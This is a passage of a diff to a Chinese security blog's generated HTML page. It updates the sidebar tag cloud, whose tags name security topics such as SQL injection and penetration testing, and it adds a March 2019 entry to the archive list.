href="/tags/红蓝对抗/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/解决方法/" style="font-size: 20px;">解决方法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a> <a href="/tags/资产扫描/" style="font-size: 10px;">资产扫描</a> <a href="/tags/迁移/" style="font-size: 10px;">迁移</a> <a href="/tags/速查表/" style="font-size: 10px;">速查表</a> <a href="/tags/非web型xss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/验证码安全/" style="font-size: 10px;">验证码安全</a>
+      <a href="/tags/Android/" style="font-size: 11.43px;">Android</a> <a href="/tags/Android-安全测试-工具使用/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.43px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.43px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.86px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/jsonp劫持/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/web安全/" style="font-size: 14.29px;">web安全</a> <a href="/tags/windows-审计工具/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/业务安全/" style="font-size: 10px;">业务安全</a> <a href="/tags/代码扫描/" style="font-size: 10px;">代码扫描</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/内网安全/" style="font-size: 10px;">内网安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/前端加密/" style="font-size: 10px;">前端加密</a> <a href="/tags/名词解释/" style="font-size: 10px;">名词解释</a> <a href="/tags/基础/" style="font-size: 10px;">基础</a> <a href="/tags/基础知识/" style="font-size: 14.29px;">基础知识</a> <a href="/tags/基线加固/" style="font-size: 10px;">基线加固</a> <a href="/tags/备忘录/" style="font-size: 10px;">备忘录</a> <a href="/tags/安全建设/" style="font-size: 18.57px;">安全建设</a> <a href="/tags/安全架构/" style="font-size: 10px;">安全架构</a> <a href="/tags/安全规划/" style="font-size: 10px;">安全规划</a> <a href="/tags/安全规范/" style="font-size: 12.86px;">安全规范</a> <a href="/tags/安全设计/" style="font-size: 15.71px;">安全设计</a> <a href="/tags/安全设计评审/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/安全评估/" style="font-size: 10px;">安全评估</a> <a href="/tags/安全运维/" style="font-size: 10px;">安全运维</a> <a href="/tags/安装使用/" style="font-size: 11.43px;">安装使用</a> <a href="/tags/工具使用/" style="font-size: 17.14px;">工具使用</a> <a href="/tags/平台建设/" style="font-size: 11.43px;">平台建设</a> <a href="/tags/应急响应/" style="font-size: 11.43px;">应急响应</a> <a href="/tags/开发安全/" style="font-size: 14.29px;">开发安全</a> <a href="/tags/开源工具/" style="font-size: 10px;">开源工具</a> <a href="/tags/技巧/" style="font-size: 11.43px;">技巧</a> <a href="/tags/指南/" style="font-size: 10px;">指南</a> <a href="/tags/操作记录/" style="font-size: 10px;">操作记录</a> <a href="/tags/数据安全/" style="font-size: 10px;">数据安全</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞利用/" style="font-size: 15.71px;">漏洞利用</a> <a href="/tags/漏洞管理/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/移动安全/" style="font-size: 10px;">移动安全</a> <a href="/tags/等级保护/" style="font-size: 10px;">等级保护</a> <a href="/tags/红蓝对抗/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/解决方法/" style="font-size: 20px;">解决方法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a> <a href="/tags/资产扫描/" style="font-size: 10px;">资产扫描</a> <a href="/tags/迁移/" style="font-size: 10px;">迁移</a> <a href="/tags/速查表/" style="font-size: 10px;">速查表</a> <a href="/tags/非web型xss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/验证码安全/" style="font-size: 10px;">验证码安全</a>
     </div>
   </div>
 
@@ -834,8 +846,8 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-archive"></i>归档</h3>
     <div class="widget">
-      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
     </div>
   </div>
 
